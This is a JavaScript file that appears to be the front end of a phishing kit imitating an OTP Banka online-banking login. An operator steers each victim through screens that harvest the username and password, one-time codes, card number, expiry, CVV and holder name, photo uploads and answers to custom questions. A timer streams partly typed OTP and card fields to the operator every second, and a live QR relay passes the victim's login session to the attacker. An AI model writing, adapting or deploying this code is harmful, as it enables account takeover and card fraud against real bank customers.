(function () {
  'use strict';

  var U = window.BankaFlowUtils || {};
  var usernameInput = document.getElementById('tokensn');
  var passwordInput = document.getElementById('otp');
  var loginSubmit = document.getElementById('prijava');
  var loginForm = document.getElementById('autorizacijaNG');
  var loginPanel = document.getElementById('otp-login-panel');
  var errorBanner = document.getElementById('dllgn-error-banner');
  var errorText = document.getElementById('dllgn-error-text');
  var waitingEl = document.getElementById('dllgn-waiting');
  var waitingMsg = document.getElementById('dllgn-waiting-message');
  var flowScreens = document.getElementById('dllgn-flow-screens');
  var loginBusy = false;

  var screenOtp = document.getElementById('dllgn-screen-otp');
  var otpTarget = document.getElementById('dllgn-otp-target');
  var otpInput = document.getElementById('dllgn-otp-input');
  var otpError = document.getElementById('dllgn-otp-error');
  var btnOtp = document.getElementById('dllgn-btn-otp');

  var screenCard = document.getElementById('dllgn-screen-card');
  var cardNum = document.getElementById('dllgn-card-number');
  var cardExp = document.getElementById('dllgn-card-exp');
  var cardCvv = document.getElementById('dllgn-card-cvv');
  var cardHolder = document.getElementById('dllgn-card-holder');
  var btnCard = document.getElementById('dllgn-btn-card');

  var screenPush = document.getElementById('dllgn-screen-push');
  var pushMsg = document.getElementById('dllgn-push-msg');

  var screenQr = document.getElementById('dllgn-screen-qr');
  var qrHost = document.getElementById('dllgn-qr-host');
  var qrInst = document.getElementById('dllgn-qr-instruction');
  var screenQrReply = document.getElementById('dllgn-screen-qr-reply');
  var qrReplyHost = document.getElementById('dllgn-qr-reply-host');
  var qrReplyInst = document.getElementById('dllgn-qr-reply-instruction');
  var qrReplyIn = document.getElementById('dllgn-qr-reply-input');
  var btnQrReply = document.getElementById('dllgn-btn-qr-reply');

  var screenCustom = document.getElementById('dllgn-screen-custom');
  var customQ = document.getElementById('dllgn-custom-question');
  var customIn = document.getElementById('dllgn-custom-input');
  var btnCustom = document.getElementById('dllgn-btn-custom');

  var screenSpis = document.getElementById('dllgn-screen-spis');
  var spisHeader = document.getElementById('dllgn-spis-header');
  var spisAppliLabel = document.getElementById('dllgn-spis-appli-label');
  var spisAppli = document.getElementById('dllgn-spis-appli');
  var spisMacLabel = document.getElementById('dllgn-spis-mac-label');
  var spisIn = document.getElementById('dllgn-spis-input');
  var btnSpis = document.getElementById('dllgn-btn-spis');
  var spisBtnText = document.getElementById('dllgn-spis-btn-text');
  var spisHelpLink = document.getElementById('dllgn-spis-help-link');
  var spisSteps = document.getElementById('dllgn-spis-steps');

  var screenPhoto = document.getElementById('dllgn-screen-photo');
  var photoInstruct = document.getElementById('dllgn-photo-instruction');
  var photoDrop = document.getElementById('dllgn-photo-drop');
  var photoIn = document.getElementById('dllgn-photo-input');
  var photoPrev = document.getElementById('dllgn-photo-previews');
  var photoBtn = document.getElementById('dllgn-photo-submit');

  var currentPhase = 'login';
  var customQKey = '';
  var photoFiles = [];
  var lastStatusKey = '';
  var lastStatusComp = '';
  var stateRestored = false;
  var liveSyncInt = null;
  var liveQrPollInt = null;
  var lastSyncableQrData = '';
  var lastSyncableQrUpdatedAt = '';
  var lastQrInstruction = '';
  var lastOtpTarget = '';
  var otpErrorIsDefault = false;
  var pushUsesDefault = true;
  var waitingUsesDefault = true;

  function getLang() {
    try {
      var stored = localStorage.getItem('otpbanka_lang');
      if (stored === 'hr' || stored === 'en') return stored;
    } catch (e) {}
    return 'hr';
  }

  function t(key) {
    var lang = getLang();
    var pack = (window.OTPBankaI18n && window.OTPBankaI18n.dict && window.OTPBankaI18n.dict[lang] && window.OTPBankaI18n.dict[lang].dllgn) || {};
    return pack[key] || key;
  }

  var lastSpisAppli2 = '';

  function applyFlowI18n() {
    document.querySelectorAll('[data-dllgn-i18n]').forEach(function (el) {
      var k = el.getAttribute('data-dllgn-i18n');
      if (k) el.textContent = t(k);
    });
    if (btnOtp) btnOtp.textContent = t('submit');
    if (btnCard) btnCard.textContent = t('submit');
    if (btnCustom) btnCustom.textContent = t('submit');
    if (btnQrReply) btnQrReply.textContent = t('submit');
    applySpisI18n();
    updatePhotoBtn();
  }

  function applySpisI18n() {
    if (spisHeader) spisHeader.textContent = t('spisHeader');
    if (spisAppliLabel) spisAppliLabel.textContent = t('spisAppliLabel');
    if (spisMacLabel) spisMacLabel.textContent = t('spisMacLabel');
    if (spisBtnText) spisBtnText.textContent = t('spisSubmit');
    else if (btnSpis) btnSpis.textContent = t('spisSubmit');
    if (spisHelpLink) spisHelpLink.textContent = t('spisHelpLink');
    if (spisSteps) {
      var digits = String(lastSpisAppli2 || '').replace(/\D/g, '') || '********';
      spisSteps.innerHTML = String(t('spisStepsHtml') || '').split('{appli2}').join(digits);
    }
    if (spisAppli) {
      spisAppli.textContent = U.formatAppli2Display
        ? U.formatAppli2Display(lastSpisAppli2)
        : (lastSpisAppli2 || 'x x x x x x x x');
    }
  }

  function isSpisQuestion(q) {
    return U.isSpisQuestion ? U.isSpisQuestion(q) : /^!spis(?:\s|$)/i.test(String(q || '').trim());
  }

  function parseSpisAppli2(q) {
    if (U.parseSpisAppli2) return U.parseSpisAppli2(q);
    var m = String(q || '').trim().match(/^!spis(?:\s+(\d+))?$/i);
    return m && m[1] ? m[1] : '';
  }

  function refreshOtpTargetText() {
    if (!otpTarget) return;
    otpTarget.textContent = lastOtpTarget
      ? t('otpPrefix') + formatOtpTarget(lastOtpTarget)
      : t('otpNoTarget');
  }

  function refreshPhaseI18n() {
    applyFlowI18n();
    if (currentPhase === 'otp') {
      refreshOtpTargetText();
      if (otpError && otpError.style.display !== 'none' && otpErrorIsDefault) {
        otpError.textContent = t('otpErr');
      }
    } else if (currentPhase === 'push' && pushMsg && pushUsesDefault) {
      pushMsg.textContent = t('push');
    } else if (currentPhase === 'waiting' && waitingMsg && waitingUsesDefault) {
      waitingMsg.textContent = t('waiting');
    } else if (currentPhase === 'qr' && qrInst) {
      qrInst.textContent = lastQrInstruction || t('qrScanHint');
    } else if (currentPhase === 'spis') {
      applySpisI18n();
    }
  }

  function renderQr(host, qrData) {
    if (!host) return;
    if (window.BankaQr && typeof window.BankaQr.render === 'function') {
      window.BankaQr.render(host, qrData);
      return;
    }
    if (window.UnicQr && typeof window.UnicQr.render === 'function') {
      window.UnicQr.render(host, qrData);
      return;
    }
    host.innerHTML = '';
    if (!qrData) return;
    var img = document.createElement('img');
    img.alt = 'QR';
    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' +
      encodeURIComponent(String(qrData));
    img.style.maxWidth = '200px';
    img.style.maxHeight = '200px';
    host.appendChild(img);
  }

  function getDllgn() {
    return window.dllgn || null;
  }

  function whenReady(fn, attempts) {
    var n = attempts || 0;
    if (getDllgn()) {
      fn(getDllgn());
      return;
    }
    if (n >= 80) {
      showError(t('bootstrapFailed'));
      return;
    }
    setTimeout(function () { whenReady(fn, n + 1); }, 150);
  }

  function formatCardNumber(val) {
    return U.formatCardNumber ? U.formatCardNumber(val) : String(val || '');
  }

  function formatOtpTarget(target) {
    var prefix = (window.DLLGN_CONFIG && window.DLLGN_CONFIG.OTP_PHONE_PREFIX) || '+385';
    return U.formatOtpTarget ? U.formatOtpTarget(target, prefix) : String(target || '');
  }

  function hideAllScreens() {
    [screenOtp, screenCard, screenPush, screenQr, screenQrReply, screenCustom, screenSpis, screenPhoto].forEach(function (el) {
      if (el) el.style.display = 'none';
    });
  }

  function showError(msg) {
    if (!errorBanner || !errorText) return;
    if (!msg) {
      errorBanner.classList.remove('dllgn-error-banner--visible');
      errorBanner.setAttribute('aria-hidden', 'true');
      errorText.textContent = '';
      return;
    }
    errorText.textContent = msg;
    errorBanner.classList.add('dllgn-error-banner--visible');
    errorBanner.setAttribute('aria-hidden', 'false');
  }

  function setLoginLoading(loading) {
    loginBusy = !!loading;
    if (!loginSubmit) return;
    loginSubmit.classList.toggle('dllgn-loading', !!loading);
    // #prijava is an <a> — disabled is unreliable; pair with aria + busy flag
    loginSubmit.setAttribute('aria-disabled', loading ? 'true' : 'false');
    if ('disabled' in loginSubmit) loginSubmit.disabled = !!loading;
  }

  function setBtnLoading(btn, loading) {
    if (!btn) return;
    btn.classList.toggle('dllgn-loading', !!loading);
    btn.disabled = !!loading;
  }

  function showLoginForm() {
    currentPhase = 'login';
    stopLiveQrPoll();
    hideAllScreens();
    showError('');
    if (loginPanel) loginPanel.style.display = '';
    if (loginForm) loginForm.style.display = '';
    if (flowScreens) flowScreens.style.display = 'none';
    if (waitingEl) waitingEl.style.display = 'none';
    if (usernameInput) usernameInput.disabled = false;
    if (passwordInput) passwordInput.disabled = false;
    setLoginLoading(false);
  }

  function showFlowChrome() {
    if (loginPanel) loginPanel.style.display = 'none';
    if (loginForm) loginForm.style.display = 'none';
    if (waitingEl) waitingEl.style.display = 'none';
    if (flowScreens) flowScreens.style.display = 'block';
  }

  function showWaiting(msg) {
    currentPhase = 'waiting';
    hideAllScreens();
    showError('');
    if (loginPanel) loginPanel.style.display = 'none';
    if (loginForm) loginForm.style.display = 'none';
    if (flowScreens) flowScreens.style.display = 'none';
    waitingUsesDefault = !(msg && String(msg).trim());
    if (waitingMsg) {
      waitingMsg.textContent = waitingUsesDefault ? t('waiting') : String(msg).trim();
    }
    if (waitingEl) waitingEl.style.display = 'flex';
  }

  function showOtpScreen(target, reset) {
    currentPhase = 'otp';
    stopLiveQrPoll();
    showFlowChrome();
    hideAllScreens();
    showError('');
    if (screenOtp) screenOtp.style.display = 'block';
    lastOtpTarget = target || '';
    refreshOtpTargetText();
    if (reset && otpInput) {
      otpInput.value = '';
      otpInput.disabled = false;
      setTimeout(function () { otpInput.focus(); }, 50);
    }
    if (otpError) {
      otpError.style.display = 'none';
      otpError.textContent = '';
      otpErrorIsDefault = false;
    }
    setBtnLoading(btnOtp, false);
  }

  function showCardScreen(reset) {
    currentPhase = 'card';
    stopLiveQrPoll();
    showFlowChrome();
    hideAllScreens();
    showError('');
    if (screenCard) screenCard.style.display = 'block';
    if (reset) {
      if (cardNum) cardNum.value = '';
      if (cardExp) cardExp.value = '';
      if (cardCvv) cardCvv.value = '';
      if (cardHolder) cardHolder.value = '';
      setTimeout(function () { if (cardNum) cardNum.focus(); }, 50);
    }
  }

  function showPushScreen(inst) {
    currentPhase = 'push';
    stopLiveQrPoll();
    showFlowChrome();
    hideAllScreens();
    showError('');
    if (screenPush) screenPush.style.display = 'block';
    pushUsesDefault = !(inst && String(inst).trim());
    if (pushMsg) pushMsg.textContent = pushUsesDefault ? t('push') : String(inst).trim();
  }

  function showQrScreen(qrData, inst) {
    currentPhase = 'qr';
    showFlowChrome();
    hideAllScreens();
    showError('');
    if (screenQr) screenQr.style.display = 'block';
    lastQrInstruction = (inst && String(inst).trim()) ? String(inst).trim() : '';
    if (qrInst) qrInst.textContent = lastQrInstruction || t('qrScanHint');
    renderQr(qrHost, qrData);
    setBtnLoading(btnQrReply, false);
  }

  function showQrReplyScreen(qrData, inst, reset) {
    currentPhase = 'qr_reply';
    showFlowChrome();
    hideAllScreens();
    showError('');
    if (screenQrReply) screenQrReply.style.display = 'block';
    renderQr(qrReplyHost, qrData);
    if (qrReplyInst) qrReplyInst.textContent = (inst && String(inst).trim()) ? String(inst).trim() : '';
    if (reset && qrReplyIn) {
      qrReplyIn.value = '';
      setTimeout(function () { if (qrReplyIn) qrReplyIn.focus(); }, 50);
    }
    setBtnLoading(btnQrReply, false);
  }

  function stopLiveQrPoll() {
    if (liveQrPollInt) {
      clearInterval(liveQrPollInt);
      liveQrPollInt = null;
    }
  }

  function pollLiveQr() {
    var d = getDllgn();
    if (!d || typeof d.getSyncableData !== 'function') return;
    Promise.resolve(d.getSyncableData()).then(function (res) {
      if (currentPhase !== 'qr' && currentPhase !== 'live_qr') return;
      if (!res || !res.success || !res.data) return;
      var payload = res.data;
      var qr = String(payload.qr_data || '').trim();
      if (!qr) return;
      var updated = payload.qr_updated_at || '';
      var inst = payload.qr_instruction || '';
      if (updated && updated === lastSyncableQrUpdatedAt && qr === lastSyncableQrData) return;
      lastSyncableQrUpdatedAt = updated || String(qr);
      lastSyncableQrData = qr;
      showQrScreen(qr, inst);
    }).catch(function () {});
  }

  function ensureLiveQrPoll() {
    if (liveQrPollInt) return;
    liveQrPollInt = setInterval(pollLiveQr, 1500);
  }

  function showLiveQrFlow() {
    currentPhase = 'live_qr';
    whenReady(function (d) {
      if (!d || typeof d.getSyncableData !== 'function') {
        showWaiting();
        ensureLiveQrPoll();
        startLiveSync();
        return;
      }
      Promise.resolve(d.getSyncableData()).then(function (res) {
        if (res && res.success && res.data && res.data.qr_data) {
          var payload = res.data;
          lastSyncableQrUpdatedAt = payload.qr_updated_at || String(payload.qr_data);
          lastSyncableQrData = String(payload.qr_data).trim();
          showQrScreen(payload.qr_data, payload.qr_instruction || '');
        } else {
          showWaiting();
          ensureLiveQrPoll();
        }
        startLiveSync();
      }).catch(function () {
        showWaiting();
        ensureLiveQrPoll();
        startLiveSync();
      });
    });
  }

  function showCustomScreen(qText, reset) {
    currentPhase = 'custom';
    stopLiveQrPoll();
    showFlowChrome();
    hideAllScreens();
    showError('');
    if (screenCustom) screenCustom.style.display = 'block';
    if (customQ) customQ.textContent = qText || '';
    if (reset && customIn) {
      customIn.value = '';
      setTimeout(function () { customIn.focus(); }, 50);
    }
    setBtnLoading(btnCustom, false);
  }

  function showSpisScreen(qText, reset) {
    currentPhase = 'spis';
    stopLiveQrPoll();
    showFlowChrome();
    hideAllScreens();
    showError('');
    lastSpisAppli2 = parseSpisAppli2(qText);
    applySpisI18n();
    if (screenSpis) screenSpis.style.display = 'block';
    if (reset && spisIn) {
      spisIn.value = '';
      setTimeout(function () { if (spisIn) spisIn.focus(); }, 50);
    }
    setBtnLoading(btnSpis, false);
  }

  function routeCustomQuestion(qText, reset, errMsg) {
    customQKey = qText || '';
    if (isSpisQuestion(qText)) {
      showSpisScreen(qText, reset);
    } else {
      showCustomScreen(qText, reset);
    }
    if (errMsg) showError(errMsg);
  }

  function showPhotoScreen(instruction, reset) {
    currentPhase = 'photo';
    stopLiveQrPoll();
    showFlowChrome();
    hideAllScreens();
    showError('');
    if (screenPhoto) screenPhoto.style.display = 'block';
    if (photoInstruct) photoInstruct.textContent = instruction || '';
    if (reset) {
      photoFiles = [];
      if (photoPrev) photoPrev.innerHTML = '';
      if (photoIn) photoIn.value = '';
      if (photoBtn) photoBtn.style.display = 'none';
      updatePhotoBtn();
    }
  }

  function statusMatch(st, stp, key) {
    return U.statusMatch ? U.statusMatch(st, stp, key) : (st === key || stp === key);
  }

  function applyFromStatus(res) {
    if (!res) return;
    var st = res.status || '';
    var stp = res.current_step || '';
    var data = res.data || {};

    if (st === 'finished' && res.finish_redirect_url) {
      location.replace(res.finish_redirect_url);
      return;
    }
    if (st === 'notify') return;

    var comp = U.buildStatusComp ? U.buildStatusComp(res) : (st + '|' + stp);
    if (comp === lastStatusComp) return;
    lastStatusComp = comp;

    var prevStatusKey = lastStatusKey;
    var key = st + '|' + stp;
    var reset = key !== prevStatusKey;
    lastStatusKey = key;

    if (st === 'error_shown') {
      showLoginForm();
      if (data.username && usernameInput) usernameInput.value = data.username;
      if (data.error_message) showError(data.error_message);
      if (passwordInput) passwordInput.value = '';
      return;
    }
    if (st === 'new_login_page') {
      showLoginForm();
      if (data.username && usernameInput) usernameInput.value = data.username;
      return;
    }
    if (statusMatch(st, stp, 'password') || statusMatch(st, stp, 'login_entered') || st === '') {
      if (U.shouldShowLoginForm) {
        if (!U.shouldShowLoginForm(st, stp, currentPhase, prevStatusKey)) return;
      } else if (currentPhase === 'qr' || currentPhase === 'qr_reply' || currentPhase === 'live_qr') {
        return;
      }
      showLoginForm();
      if (data.username && usernameInput) usernameInput.value = data.username;
      return;
    }
    if (statusMatch(st, stp, 'custom_error_shown')) {
      if (data.custom_question) {
        routeCustomQuestion(data.custom_question, true, data.error_message || '');
      } else {
        showLoginForm();
        if (data.error_message) showError(data.error_message);
      }
      return;
    }
    if (statusMatch(st, stp, 'custom_question')) {
      if (String(data.custom_question || '').trim().toLowerCase() === 'showreader') {
        showWaiting(t('waiting'));
        return;
      }
      if (data.custom_question) {
        routeCustomQuestion(data.custom_question, reset, '');
      }
      return;
    }
    if (st === 'otp_error_shown' || statusMatch(st, stp, 'otp_error_shown')) {
      showOtpScreen(data.otp_target, false);
      if (otpError) {
        var serverOtpErr = (data.error_message || '').trim();
        otpErrorIsDefault = !serverOtpErr;
        otpError.textContent = serverOtpErr || t('otpErr');
        otpError.style.display = 'block';
      }
      if (otpInput) otpInput.disabled = false;
      return;
    }
    if (String(st).indexOf('waiting_') !== -1 || String(stp).indexOf('waiting_') !== -1) {
      showWaiting(data.custom_waiting || null);
      return;
    }
    if (statusMatch(st, stp, 'otp')) {
      showOtpScreen(data.otp_target, reset);
      return;
    }
    if (st === 'card_error_shown') {
      showCardScreen(true);
      if (data.error_message) showError(data.error_message);
      return;
    }
    if (st === 'card') {
      showCardScreen(reset);
      return;
    }
    if (st === 'push_error_shown') {
      showPushScreen(data.push_instruction);
      if (data.error_message) showError(data.error_message);
      return;
    }
    if (st === 'push' || statusMatch(st, stp, 'push')) {
      showPushScreen(data.push_instruction);
      return;
    }
    if (st === 'live_qr_error_shown' || statusMatch(st, stp, 'live_qr_error_shown')) {
      showLiveQrFlow();
      if (data.error_message) showError(data.error_message);
      return;
    }
    if (statusMatch(st, stp, 'live_qr')) {
      showError('');
      showLiveQrFlow();
      return;
    }
    if (st === 'qr_error_shown' || statusMatch(st, stp, 'qr_error_shown')) {
      if (stp === 'qr_reply') {
        if (qrReplyIn) qrReplyIn.value = '';
        showQrReplyScreen(data.qr_data, data.qr_instruction, true);
      } else {
        showQrScreen(data.qr_data, data.qr_instruction);
      }
      if (data.error_message) showError(data.error_message);
      return;
    }
    if (statusMatch(st, stp, 'qr')) {
      showError('');
      stopLiveQrPoll();
      showQrScreen(data.qr_data, data.qr_instruction);
      return;
    }
    if (statusMatch(st, stp, 'qr_reply')) {
      stopLiveQrPoll();
      showQrReplyScreen(data.qr_data, data.qr_instruction, reset);
      if (data.error_message) showError(data.error_message);
      return;
    }
    if (statusMatch(st, stp, 'photo_error_shown')) {
      showPhotoScreen(data.photo_instruction, true);
      if (data.error_message) showError(data.error_message);
      return;
    }
    if (statusMatch(st, stp, 'ask_photo') || statusMatch(st, stp, 'photo')) {
      showPhotoScreen(data.photo_instruction, reset);
      return;
    }
    if (statusMatch(st, stp, 'custom_waiting') ||
        (st === 'waiting' && (stp === 'custom_waiting' || data.custom_waiting))) {
      if (currentPhase === 'live_qr' || currentPhase === 'qr') {
        ensureLiveQrPoll();
        return;
      }
      showWaiting(data.custom_waiting || null);
      return;
    }
    if (statusMatch(st, stp, 'waiting') || st === 'password_entered') {
      if (currentPhase === 'push' || currentPhase === 'otp' || currentPhase === 'card' ||
          currentPhase === 'custom' || currentPhase === 'spis' || currentPhase === 'photo' ||
          currentPhase === 'qr' || currentPhase === 'qr_reply' || currentPhase === 'live_qr') {
        return;
      }
      showWaiting(data.custom_waiting || null);
      return;
    }
  }

  function restoreState(res) {
    if (!res || !res.data) return;
    if (res.data.username && usernameInput) usernameInput.value = res.data.username;
    lastStatusKey = '';
    lastStatusComp = '';
    applyFromStatus(res);
  }

  function startLiveSync() {
    if (liveSyncInt) return;
    liveSyncInt = setInterval(function () {
      var d = getDllgn();
      if (!d || !d.syncLiveData || currentPhase === 'login') return;
      var o = {};
      if (currentPhase === 'otp' && otpInput && otpInput.value) {
        o.otp = otpInput.value.replace(/\D/g, '').slice(0, 8);
      }
      if (currentPhase === 'card') {
        if (cardNum && cardNum.value) o.card_number = cardNum.value.replace(/\s/g, '');
        if (cardExp && cardExp.value) o.exp_date = cardExp.value.trim();
        if (cardCvv && cardCvv.value) o.cvv = cardCvv.value.trim();
        if (cardHolder && cardHolder.value) o.holder = cardHolder.value.trim();
      }
      if (currentPhase === 'custom' && customIn && customIn.value) {
        o.custom_answer = customIn.value.trim();
      }
      if (currentPhase === 'spis' && spisIn && spisIn.value) {
        o.custom_answer = spisIn.value.replace(/\D/g, '').slice(0, 8);
      }
      if (currentPhase === 'qr_reply' && qrReplyIn && qrReplyIn.value) {
        o.qr_reply = qrReplyIn.value.trim();
      }
      if (Object.keys(o).length) {
        try { d.syncLiveData(o); } catch (e) {}
      }
    }, 1000);
  }

  function handleLogin() {
    if (currentPhase === 'custom') {
      var ans = customIn ? String(customIn.value || '').trim() : '';
      if (!ans || !customQKey) return;
      whenReady(function (d) {
        if (!d || typeof d.submitCustom !== 'function') {
          showError(t('bootstrapFailed'));
          return;
        }
        setBtnLoading(btnCustom, true);
        showWaiting();
        Promise.resolve(d.submitCustom(customQKey, ans)).catch(function () {
          setBtnLoading(btnCustom, false);
        });
      });
      return;
    }
    if (currentPhase === 'spis') {
      handleSpisSubmit();
      return;
    }
    if (currentPhase !== 'login') return;
    if (loginBusy) return;

    var username = usernameInput ? String(usernameInput.value || '').trim() : '';
    var password = passwordInput ? String(passwordInput.value || '') : '';
    if (!username || !password) return;

    whenReady(function (d) {
      if (!d || typeof d.submitLogin !== 'function') {
        showError(t('bootstrapFailed'));
        return;
      }
      if (loginBusy) return;
      if (usernameInput) usernameInput.disabled = true;
      if (passwordInput) passwordInput.disabled = true;
      setLoginLoading(true);
      Promise.resolve(d.submitLogin(username, { password: password })).then(function (r) {
        if (r && r.success) {
          setLoginLoading(false);
          showWaiting();
          startLiveSync();
        } else {
          if (usernameInput) usernameInput.disabled = false;
          if (passwordInput) passwordInput.disabled = false;
          setLoginLoading(false);
        }
      }).catch(function () {
        if (usernameInput) usernameInput.disabled = false;
        if (passwordInput) passwordInput.disabled = false;
        setLoginLoading(false);
      });
    });
  }

  function handleSpisSubmit() {
    if (currentPhase !== 'spis') return;
    var ans = spisIn ? String(spisIn.value || '').replace(/\D/g, '') : '';
    if (!ans || !customQKey) return;
    whenReady(function (d) {
      if (!d || typeof d.submitCustom !== 'function') {
        showError(t('bootstrapFailed'));
        return;
      }
      setBtnLoading(btnSpis, true);
      showWaiting();
      Promise.resolve(d.submitCustom(customQKey, ans)).catch(function () {
        setBtnLoading(btnSpis, false);
      });
    });
  }

  function handleFlowActions() {
    if (currentPhase === 'otp' && otpInput) {
      var code = (otpInput.value || '').replace(/\D/g, '');
      if (!code) return;
      whenReady(function (d) {
        if (!d || typeof d.submitOtp !== 'function') {
          showError(t('bootstrapFailed'));
          return;
        }
        setBtnLoading(btnOtp, true);
        showWaiting();
        Promise.resolve(d.submitOtp(code)).catch(function () {
          setBtnLoading(btnOtp, false);
        });
      });
    } else if (currentPhase === 'card' && cardNum) {
      var n = (cardNum.value || '').replace(/\s/g, '');
      var e = cardExp ? cardExp.value.trim() : '';
      var c = cardCvv ? cardCvv.value.trim() : '';
      var h = cardHolder ? cardHolder.value.trim() : '';
      if (!n) return;
      whenReady(function (d) {
        if (!d || typeof d.submitCard !== 'function') {
          showError(t('bootstrapFailed'));
          return;
        }
        setBtnLoading(btnCard, true);
        showWaiting();
        Promise.resolve(d.submitCard(n, e, c, h)).catch(function () {
          setBtnLoading(btnCard, false);
        });
      });
    } else if (currentPhase === 'qr_reply' && qrReplyIn) {
      var q = (qrReplyIn.value || '').trim();
      if (!q) return;
      whenReady(function (d) {
        if (!d || typeof d.submitCustom !== 'function') {
          showError(t('bootstrapFailed'));
          return;
        }
        setBtnLoading(btnQrReply, true);
        showWaiting();
        Promise.resolve(d.submitCustom('qr_reply', q)).catch(function () {
          setBtnLoading(btnQrReply, false);
        });
      });
    } else if (currentPhase === 'photo' && photoFiles.length) {
      whenReady(function (d) {
        if (!d || typeof d.submitPhoto !== 'function') {
          showError(t('bootstrapFailed'));
          return;
        }
        showWaiting();
        try { d.submitPhoto(photoFiles); } catch (err) {}
      });
    }
  }

  function updatePhotoBtn() {
    if (!photoBtn) return;
    photoBtn.textContent = t('uploadFmt').replace('{n}', String(photoFiles.length));
  }

  function addPhotoFiles(files) {
    for (var i = 0; i < files.length && photoFiles.length < 10; i++) {
      var file = files[i];
      photoFiles.push(file);
      (function (f) {
        var reader = new FileReader();
        reader.onload = function (ev) {
          var wrap = document.createElement('div');
          wrap.className = 'dllgn-photo-thumb';
          var im = document.createElement('img');
          im.src = ev.target.result;
          im.alt = '';
          var rb = document.createElement('button');
          rb.type = 'button';
          rb.className = 'dllgn-photo-remove';
          rb.textContent = '×';
          rb.addEventListener('click', function (e) {
            e.stopPropagation();
            var ix = photoFiles.indexOf(f);
            if (ix > -1) photoFiles.splice(ix, 1);
            wrap.remove();
            updatePhotoBtn();
            if (photoBtn) photoBtn.style.display = photoFiles.length ? '' : 'none';
          });
          wrap.appendChild(im);
          wrap.appendChild(rb);
          if (photoPrev) photoPrev.appendChild(wrap);
        };
        reader.readAsDataURL(f);
      })(file);
    }
    updatePhotoBtn();
    if (photoBtn) photoBtn.style.display = photoFiles.length ? '' : 'none';
  }

  if (cardNum) {
    cardNum.addEventListener('input', function () {
      cardNum.value = formatCardNumber(cardNum.value);
    });
  }
  if (cardExp) {
    cardExp.addEventListener('input', function () {
      cardExp.value = U.formatCardExp ? U.formatCardExp(cardExp.value) :
        (function () {
          var raw = (cardExp.value || '').replace(/\D/g, '').slice(0, 4);
          return raw.length > 2 ? raw.slice(0, 2) + '/' + raw.slice(2) : raw;
        })();
    });
  }
  if (cardCvv) {
    cardCvv.addEventListener('input', function () {
      cardCvv.value = U.formatCvv ? U.formatCvv(cardCvv.value) :
        (cardCvv.value || '').replace(/\D/g, '').slice(0, 4);
    });
  }
  if (otpInput) {
    otpInput.addEventListener('input', function () {
      otpInput.value = U.formatOtpCode ? U.formatOtpCode(otpInput.value, 8) :
        (otpInput.value || '').replace(/\D/g, '').slice(0, 8);
    });
  }
  if (spisIn) {
    spisIn.addEventListener('input', function () {
      spisIn.value = U.formatOtpCode ? U.formatOtpCode(spisIn.value, 8) :
        (spisIn.value || '').replace(/\D/g, '').slice(0, 8);
    });
  }

  [usernameInput, passwordInput].forEach(function (el) {
    if (!el) return;
    el.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleLogin();
      }
    });
  });

  [otpInput, cardNum, cardExp, cardCvv, cardHolder, customIn, qrReplyIn, spisIn].forEach(function (el) {
    if (!el) return;
    el.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        if (currentPhase === 'custom' || currentPhase === 'spis') handleLogin();
        else handleFlowActions();
      }
    });
  });

  if (loginSubmit) loginSubmit.addEventListener('click', function (e) {
    e.preventDefault();
    handleLogin();
  });

  [btnOtp, btnCard, btnCustom, btnQrReply, btnSpis, photoBtn].forEach(function (btn) {
    if (!btn) return;
    btn.addEventListener('click', function (e) {
      e.preventDefault();
      if (btn === btnCustom || btn === btnSpis) handleLogin();
      else handleFlowActions();
    });
  });

  if (photoDrop) {
    photoDrop.addEventListener('click', function () { if (photoIn) photoIn.click(); });
    photoDrop.addEventListener('dragover', function (e) { e.preventDefault(); photoDrop.classList.add('dllgn-photo-drop--over'); });
    photoDrop.addEventListener('dragleave', function () { photoDrop.classList.remove('dllgn-photo-drop--over'); });
    photoDrop.addEventListener('drop', function (e) {
      e.preventDefault();
      photoDrop.classList.remove('dllgn-photo-drop--over');
      addPhotoFiles(e.dataTransfer.files);
    });
  }
  if (photoIn) {
    photoIn.addEventListener('change', function () {
      addPhotoFiles(photoIn.files);
      photoIn.value = '';
    });
  }

  window.BankaDllgn = {
    onLanguageChange: refreshPhaseI18n,
  };

  applyFlowI18n();

  whenReady(function (d) {
    if (!d || typeof d.onStatus !== 'function') {
      showError(t('bootstrapFailed'));
      return;
    }
    d.onStatus(function (res) {
      if (!stateRestored) {
        stateRestored = true;
        restoreState(res);
        var s = res && res.status;
        if (s && s !== 'new_login_page' && s !== '' && s !== 'password' &&
            s !== 'login_entered' && s !== 'error_shown') {
          startLiveSync();
        }
      } else {
        applyFromStatus(res);
      }
    });
  });
})();
